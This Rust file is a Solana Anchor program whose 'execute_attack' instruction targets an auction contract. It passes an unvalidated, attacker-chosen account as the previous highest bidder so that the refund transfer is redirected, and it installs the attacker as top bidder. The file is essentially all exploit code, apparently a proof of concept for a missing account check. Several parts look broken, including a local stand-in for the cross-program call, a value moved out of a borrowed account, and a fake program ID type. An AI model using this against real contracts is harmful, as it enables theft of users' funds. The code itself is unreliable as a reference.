use anchor_lang::prelude::*;
use anchor_spl::token::spl_token;

declare_id!("7M5G4aCAzGquFrabqTJVaZHNmHL6Yk4chnNWdd5AZiHX");

#[program]
pub mod auction_cpi {
    use super::*;

    pub fn execute_attack(ctx: Context<ExecuteAttack>, bid_amount: u64) -> Result<()> {
        let cpi_ctx = ctx.accounts.create_cpi_context();
        place_bid(cpi_ctx, bid_amount)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct ExecuteAttack<'info> {
    #[account(mut)]
    pub auction_account: Account<'info, AuctionAccount>,
    #[account(mut)]
    /// CHECK: TODO
    pub attack_account: AccountInfo<'info>,
    #[account(mut)]
    pub attacker: Signer<'info>,
    pub auction_program: Program<'info, Auction>,
}

impl<'info> ExecuteAttack<'info> {
    pub fn create_cpi_context(&self) -> CpiContext<'_, '_, '_, 'info, PlaceBid<'info>> {
        let cpi_program = self.auction_program.to_account_info();
        let cpi_accounts = PlaceBid {
            auction_account: self.auction_account.clone(),
            previous_highest_bidder: self.attack_account.clone(),
            current_bidder: self.attacker.clone(),
            authority: self.attacker.clone(),
        };
        CpiContext::new(cpi_program, cpi_accounts)
    }
}

pub fn place_bid<'info>(
    ctx: CpiContext<'_, '_, '_, 'info, PlaceBid<'info>>,
    bid_amount: u64,
) -> Result<()> {
    let mut auction = ctx.accounts.auction_account;

    // Ensure bid amount > current highest bid
    require!(bid_amount > auction.highest_bid, ErrorCode::BidTooLow);

    // Refund the previous highest bidder
    if auction.highest_bid > 0 {
        let previous_highest_bidder = &ctx.accounts.previous_highest_bidder;
        let refund_amount = auction.highest_bid;
        let ix = spl_token::instruction::transfer(
            &spl_token::ID,
            &auction.key(),
            &previous_highest_bidder.key(),
            &ctx.accounts.authority.key(),
            &[],
            refund_amount,
        )?;
        anchor_lang::solana_program::program::invoke_signed(
            &ix,
            &[
                auction.to_account_info(),
                previous_highest_bidder.to_account_info(),
                ctx.accounts.authority.to_account_info(),
            ],
            ctx.signer_seeds,
        )?;
    }

    // Update auction state
    auction.highest_bid = bid_amount;
    auction.highest_bidder = ctx.accounts.current_bidder.key();

    Ok(())
}

#[derive(Accounts, Clone)]
pub struct PlaceBid<'info> {
    #[account(mut)]
    pub auction_account: Account<'info, AuctionAccount>,
    /// CHECK: TODO
    #[account(mut)]
    pub previous_highest_bidder: AccountInfo<'info>,
    #[account(mut)]
    pub current_bidder: Signer<'info>,
    pub authority: Signer<'info>,
}

#[account]
#[derive(Debug, Default, PartialEq, Copy)]
pub struct AuctionAccount {
    pub highest_bid: u64,
    pub highest_bidder: Pubkey,
}

#[derive(Clone, Debug, Default, PartialEq, Copy)]
pub struct Auction(AuctionAccount);

impl anchor_lang::Id for Auction {
    fn id() -> Pubkey {
        ID
    }
}
#[error_code]
pub enum ErrorCode {
    #[msg("Bid is too low.")]
    BidTooLow,
}
